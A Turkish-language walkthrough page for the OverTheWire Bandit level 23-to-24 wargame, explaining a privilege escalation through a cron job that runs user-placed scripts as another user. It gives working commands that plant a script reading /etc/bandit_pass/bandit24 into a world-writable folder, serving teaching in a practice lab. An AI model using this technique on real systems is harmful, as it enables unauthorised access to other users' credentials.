# 02 · Kendi betiğini koşturmak

[Başlangıç](../README.md) · [Part 5 içindekiler](README.md)

**Hedef:** `bandit24`'ün parolası. Bu kez cron job bir dosyayı okumuyor; `/var/spool/bandit24/foo/` klasörüne bırakılan **her betiği `bandit24` olarak çalıştırıp siliyor.** Yani parolayı almak için, o klasöre **kendi betiğimizi** koymalıyız. Serinin bizden ilk kez kod yazmasını isteyen adımı.

## Betiği okumak

```
$ cat /usr/bin/cronjob_bandit24.sh
...
cd /var/spool/"$myname"/foo
for i in * .*; do
    ...
    owner="$(stat --format "%U" "./$i")"
    if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
        timeout -s 9 60 "./$i"
    fi
    rm -rf "./$i"
done
```

Betik her dakika `foo` klasöründeki dosyaları geziyor, **sahibi `bandit23` olan** çalıştırılabilir dosyaları `bandit24` yetkisiyle koşturuyor ve sonra siliyor. Plan net: `bandit24`'ün parolasını okuyup bize ait bir yere yazan küçük bir betik yazacağız, klasöre koyacağız ve cron'un onu çalıştırmasını bekleyeceğiz.

## Betiği yazıp yerleştirmek

Önce çıktının yazılacağı, herkesin erişebileceği geçici bir yer hazırlarız, sonra betiği yazarız:

```
$ mkdir /tmp/is24 && chmod 777 /tmp/is24
$ cat > /tmp/is24/al.sh << 'EOF'
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/is24/parola
EOF
$ chmod +x /tmp/is24/al.sh
$ cp /tmp/is24/al.sh /var/spool/bandit24/foo/
```

Sonra cron'un çalışmasını bekleriz (en fazla bir dakika) ve çıktıyı okuruz:

```
$ cat /tmp/is24/parola
‹bandit24 parolası›
```

## Perde arkası

Bu, ilk "kendi kodunu çalıştırt" bulmacan — ve yetki yükseltmenin çok yaygın bir örüntüsü. Bir sistem, senin kontrol ettiğin bir dosyayı **daha yetkili biri** olarak çalıştırıyorsa, o dosyaya koyduğun her şey o yetkiyle koşar. Buradaki incelikler öğreticidir: çıktı klasörünü herkesin yazabileceği izinle (`777`) açmak gerekir, çünkü betiği `bandit24` çalıştırır ve dosyayı oraya *o* yazar; ayrıca betik çalıştıktan sonra silineceği için çıktıyı kalıcı bir yere yazmak gerekir. Kendi kodunu başka bir kimliğe koşturtmak, gerçek dünyadaki birçok saldırının özüdür.

> **Faydalı olabilir:** [Bandit Level 24](https://overthewire.org/wargames/bandit/bandit24.html).

<!-- part5-altnav -->

---

← [01 · Adı hesaplanan dosya](01-adi-hesaplanan-dosya.md) · [Part 5 içindekiler](README.md) · [03 · Pin kodunu kırmak](03-pin-kodunu-kirmak.md) →
